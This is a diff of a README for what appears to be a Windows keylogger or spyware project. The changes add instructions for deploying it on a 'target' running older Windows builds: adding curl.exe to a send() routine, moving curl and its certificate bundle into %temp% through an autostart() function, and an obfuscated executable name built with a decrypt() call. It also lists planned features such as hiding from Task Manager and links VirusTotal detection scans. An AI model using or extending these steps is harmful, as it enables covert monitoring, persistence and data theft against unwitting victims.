@@ -7,7 +7,7 @@
 
 ## Instalation if ur target use windows older than 1706
 * In the function send() in string "cmd" add .exe after "curl"
-* After ``` << "move " + exe_name + " %temp%\n" ``` add in the function autostart() this:
+* After ```<< "\nmove " + decrypt(exe_name + "!&ufnq&")+"\n" ``` add in the function autostart() this:
 ``` 
  << "move curl.exe %temp%\n";
  << "move curl-ca-bundle.crt %temp%\n";
@@ -24,7 +24,7 @@
 - [ ] encrypt logs
 - [ ] hide it from taskmanager
 
-[VirusTotal scan](https://www.virustotal.com/gui/file/f33654df72489adf5c3058c3867f318180a6aa51e1a5006aba09a05ce4554871/detection)
+[VirusTotal scan](https://www.virustotal.com/gui/file/22e1be46de7e6be7efe9d6edbf02d9ea0429a13bf5748db916c7a5a94aa9f18d/detection)
 
 if you don't need all of these features, just keylogger - checkout my older keylogger project
 
